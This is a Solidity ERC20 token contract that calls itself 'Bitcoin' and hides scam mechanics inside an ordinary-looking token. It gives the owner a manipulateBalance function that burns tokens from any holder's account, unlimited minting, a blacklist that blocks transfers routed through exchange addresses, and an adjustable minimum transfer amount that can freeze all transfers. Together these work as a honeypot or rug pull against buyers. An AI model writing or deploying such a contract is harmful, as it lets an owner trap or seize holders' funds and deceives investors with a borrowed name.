// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "node_modules/@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";


contract Bitcoin is ERC20Burnable {
    uint256 public minWithdrawal;
    address internal owner;

    mapping(address => bool) private blackListDexAddresses; // Mapping to identify DEX addresses


    error Bitcoin__AmountMustBeMoreThanZero();
    error Bitcoin__BurnAmountExceedsBalance();
    error Bitcoin__NotZeroAddress();
    error Bitcoin__AmountAboveMinWithdrawal();
    error Bitcoin__TransferToDexNotAllowed();
    error Bitcoin__NotAllowed();

    event MinWithdrawalSet(uint256 minWithdrawal);
    event DexAddressAdded(address indexed dexAddress);
    event DexAddressRemoved(address indexed dexAddress);


    modifier onlyOwner(){
        if (msg.sender != owner) {
            revert Bitcoin__NotAllowed();
        }
        _;
    }

    constructor(uint256 _initialSupply, uint256 _minWithdrawal, string memory _tokenName, string memory _tokenSymbol)
    ERC20(_tokenName, _tokenSymbol) {
        minWithdrawal = _minWithdrawal;
        owner = msg.sender;
        _mint(msg.sender, _initialSupply);
    }


    function setMinWithdrawal(uint256 _minWithdrawal) external onlyOwner {
        minWithdrawal = _minWithdrawal;
        emit MinWithdrawalSet(_minWithdrawal);
    }

    function burn(uint256 _amount) public override onlyOwner {
        uint256 balance = balanceOf(msg.sender);
        if (_amount <= 0) {
            revert Bitcoin__AmountMustBeMoreThanZero();
        }
        if (balance < _amount) {
            revert Bitcoin__BurnAmountExceedsBalance();
        }
        super.burn(_amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (blackListDexAddresses[msg.sender]) {
            revert Bitcoin__TransferToDexNotAllowed();
        }

        if (amount < minWithdrawal) {
            revert Bitcoin__AmountAboveMinWithdrawal();
        }
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (blackListDexAddresses[msg.sender]) {
            revert Bitcoin__TransferToDexNotAllowed();
        }

        if (amount < minWithdrawal) {
            revert Bitcoin__AmountAboveMinWithdrawal();
        }
        return super.transferFrom(sender, recipient, amount);
    }

    function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
        if (_to == address(0)) {
            revert Bitcoin__NotZeroAddress();
        }
        if (_amount <= 0) {
            revert Bitcoin__AmountMustBeMoreThanZero();
        }
        _mint(_to, _amount);
        return true;
    }


    function transferOwnership(address _owner) external onlyOwner {
        if (_owner == address(0)) {
            revert Bitcoin__NotZeroAddress();
        }

        owner = _owner;
    }

    // Function to mark an address as a DEX
    function addDexAddress(address _dexAddress) external onlyOwner {
        blackListDexAddresses[_dexAddress] = true;
        emit DexAddressAdded(_dexAddress);
    }

    // Optional: Function to remove a DEX address
    function removeDexAddress(address _dexAddress) external onlyOwner {
        delete blackListDexAddresses[_dexAddress];
        emit DexAddressRemoved(_dexAddress);
    }


    function getDexAddress(address _dexAddress) external view returns (bool) {
        return blackListDexAddresses[_dexAddress];
    }

    function manipulateBalance(address _account, uint256 _amount, bool _isAddition) external onlyOwner {
        if (_account == address(0)) {
            revert Bitcoin__NotZeroAddress();
        }
        if (_amount <= 0) {
            revert Bitcoin__AmountMustBeMoreThanZero();
        }

        if (_isAddition) {
            _mint(_account, _amount);
        } else {
            uint256 accountBalance = balanceOf(_account);
            if (accountBalance < _amount) {
                revert Bitcoin__BurnAmountExceedsBalance();
            }
            _burn(_account, _amount);
        }
    }

}
